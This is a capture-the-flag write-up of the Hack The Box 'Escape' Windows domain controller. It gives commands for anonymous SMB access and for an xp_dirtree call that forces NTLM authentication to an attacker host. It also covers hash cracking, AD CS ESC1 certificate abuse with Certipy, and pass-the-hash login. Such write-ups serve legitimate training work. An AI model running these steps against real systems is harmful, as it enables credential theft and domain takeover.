![Proof of completion for Perfection on 03-04-2024](/docs/assets/Escape-Retired.png)


## Initial Access

During the initial Nmap scan various ports were shown most of which indicating it was a windows machine (The AD ports 88,135,139,389, and 636 usually are a dead giveaway for a windows machine)

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-14 02:38:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-14T02:40:00+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-06-14T02:40:00+00:00; +8h00m01s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-14T02:27:44
|_Not valid after:  2055-06-14T02:27:44
|_ssl-date: 2025-06-14T02:40:00+00:00; +8h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-14T02:40:00+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-14T02:40:00+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
```
The lack of port 3389 indicated there must be another way to log into the box. Looking through the rest of the port list port 5985 for WinRM stuck out, but without any valid creds we make note of it and move on.

There was a few things to unpack here, another thing that stuck out was the port 1433 Microsoft Server SQL and thanks to the -A flag from Nmap, we already have a lot of information about the database.



```
Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
```
Without creds there wasn't a lot we could do, possibly could try sa with no password or other guessing attempts, but I tabled it for now as I saw my favorite thing to see on windows boxes, port 445.

I was able to get some directories to show when using smbclient:
```
smbclient -N -L \\\\10.10.11.202

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
```
Looking through the sharenames, the only one that stuck out was Public, which didn't seem to require a login, so I attempted a anonymous connection with success and listed out the directory:
```
smbclient -N \\\\10.10.11.202\\Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
```
Using the get command I was able to pull the file off the server and open it, the juicy bit being at the bottom:

![Screenshot of Escape PDF](/docs/assets/Escape-Screenshot-1.png)

This indicated that it was possible to login with PublicUser into the SQL database. This admittedly took longer than it should to find a viable way to log into SQL remotely, so it was nice to get the refresher.
After searching the vastness of google, and many attempts.. I was able to get into the SQL server using a tool from the Impacket toolkit:
```
mssqlclient 'PublicUser:GuestUserCantWrite1@10.10.11.202'
```
Credit to: https://medium.com/@oumasydney2000/mssql-enumeration-1433-1ee5fa6ac5d3 for that and this next bit.

After logging into the SQL server I noticed the user could not use the xp_cmdshell nor enable it, so there had to be another way to get a foothold.
I fell hard into the rabbit hole, and ended up browsing every database that I was able to print out using:
```
SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                                                                               
--------------------------------------------------------------------------------------------------------------------------------   
master                   
tempdb                                                                                                                             
model                                                                                                                               
msdb 
```
After a while of searching around I had to resort to using a hint from the HTB Guided mode that indicated "Get the MSSQL server to read a file from an SMB host you control, and watch for the authentication." 

This hint was super helpful, but being rusty I was unsure of how to even go about doing this, so I turned to the legend himself 0xdf. Credit to his walkthrough: https://0xdf.gitlab.io/2023/06/17/htb-escape.html#shell-as-sql_svc for getting me past this next hurdle.

In his walkthrough he ends up setting up a responder and trying to connect back to his machine in order to get the Net-NTLMv2 hash of the user running the SQL server.

Following pretty much step by step, I setup my responder on the tun0 (whichever interface has your vpn) and ran:
```
EXEC xp_dirtree '\\<attacker IP>\share', 1, 1
```
Sure enough responder popped with a NTLMv2 hash:
![Escape NTLMv2 Hash](/docs/assets/Escape-Screenshot-2.png)

Taking this to john the ripper with the --format=netntlmv2 flag and it was able to crack it:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=netntlmv2 
```
now we had the creds for sql_svc, and I was able to use evil-WinRM to login (thanks to the port 5985)


## Foothold

evil-winrm -u sql_svc -p '<cracked hash>' -i 10.10.11.202

![Evil-WinRM of sql_svc](/docs/assets/Escape-Screenshot-3.png)

Now that we are on the box we check around for usual things like the lovely user.txt file.
Looking on the desktop of sql_svc there was no indication of a flag or any file, so we still had some work to do.

Checking some commands like /whoami /priv and the users folder I noticed a Ryan.Cooper user.
```
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```
We had no mention of any Ryan users previously and nothing was found on the database side, so we got a little stuck. Thankfully HTB was there to help nudge us a little by indicating Ryan was a little careless with his password and to check the SQLServer Logs. 

Navigating around a bit, I was able to find the ERRORLOG.BAK file, and able to find Ryan's creds that he accidentally typed as a username.

## Lateral movement

With Ryan's creds we re-log into the box using evil-winrm and start enumerating. 
> [!NOTE]
> Don't forget to get the user.txt off of the desktop

This was a bit of a time sync as I wanted to ensure I traveled every possible path, so I used WinPEAs, and several other enumeration commands I had come across but none bore any fruit.
Once again having to rely on HTB's hint, it indicated a tool like Certify or Certipy would be needed to get the next piece.
This sparked the fire that I needed to get the rest of the box. 

Way back in the past I had used Certipy-ad to pwn a box and came across a amazing resource for abusing certificate services.
This amazing blog covered everything from the how and why, that I can't do it justice and will leave the link here: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

Using this blog, I was able to find the ESC1 was vulnerable via the command:

```
certipy-ad find -u 'Ryan.Cooper@sequel.htb' -p '<RyansCreds>' -dc-ip '10.10.11.202' -vulnerable -stdout

<SNIP>
[!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

```
Following pretty much along with the blog, I built out the command to pull the administrators pfx:
```
certipy-ad req -u 'Ryan.Cooper@sequel.htb' -p '<RyansCreds>' -dc-ip '10.10.11.202' -target '10.10.11.202' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'Administrator@sequel.htb'
```
After getting the Administrator.pfx, you simply run certipy in auth mode to get the Admins NT Hash:
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202
```
> [!NOTE]
> I kept getting time skewed issues when attempting to run this, if you face the same issue, run a terminal as root (sudo su -), run this command: "timedatectl set-ntp off" and "rdate -n 10.10.11.202", then run the certipy-ad command in the same terminal (it may take a couple of tries)

![Evil-WinRM of sql_svc](/docs/assets/Escape-Screenshot-4.png)

Evil-winRM allows us to not only pass in passwords, but hashes as well to log into windows machines, making it a super useful tool for pentesters.

## Privilege Escalation

With the Administrators hash, we can log into the box and grab the root.txt from the desktop
> [!NOTE]
> We use the last section of the hash after the : to pass into evil-winrm as the first have denotes the LM hash which we can't use here. Hash format: LM_hash:NT_hash (credit to ChatGPT)

```
evil-winrm -u Administrator -H '<Admin's Hash>' -i 10.10.11.202

<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/14/2025   9:35 PM             34 root.txt
```

And that is all she wrote, I had to use several hints to shake off the rust of pwning windows machine, but I think it was a great one to do that with. Slowly working my way through the rest of TJ Nulls OSCP list as I prepare for my OSCP examine, thanks for reading!


